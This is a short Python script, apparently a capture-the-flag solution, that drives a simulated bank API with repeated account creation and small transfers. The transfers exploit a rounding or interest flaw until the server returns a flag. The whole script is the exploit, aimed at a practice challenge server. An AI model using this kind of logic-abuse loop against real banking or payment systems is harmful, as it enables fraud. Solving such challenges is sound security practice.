import requests
import json

headers = {
    'Authorization': 'Bearer ' + input('Your Token:')
}

class Bank:
    def __init__ (self):
        self.s = requests.session()
        self.s.headers.update(headers)

    def user(self):
        return self.s.get("http://202.38.93.111:10100/api/user").json()

    def create(self, t) :
    # debit or credit
        self.s.post("http://202.38.93.111:10100/api/create", json={"type": t})

    def transfer(self, src, dst, amount):
        self.s.post("http://202.38.93.111:10100/api/transfer", json={"src": src, "dst": dst, "amount": amount})

    def eat(self, account):
        self.s.post( "http://202.38.93.111:10100/api/eat", json={"account": account})

    def reset(self):
        self.s.post("http://202.38.93.111:10100/api/reset", json={})

pay_id = []
get_id = []

order = 1

bank = Bank()

bank.reset()

for _ in range(20):
    bank.create('credit')
    order += 1
    pay_id.append(order)
    bank.transfer(order,1,2099)
    for i in range(12):
        bank.create('debit')
        order += 1
        bank.transfer(1,order,167)
        if i < 10:
            get_id.append(order)

print('card done.')

days = 0

while True:
    flag = bank.user()['flag']
    if flag != None:
        print(flag)
    bank.eat(1)
    num = 0
    for pay in pay_id:
        for _ in range(10):
            bank.transfer(get_id[num],pay,1)
            num += 1
    print('day ' + str(days))
    days += 1

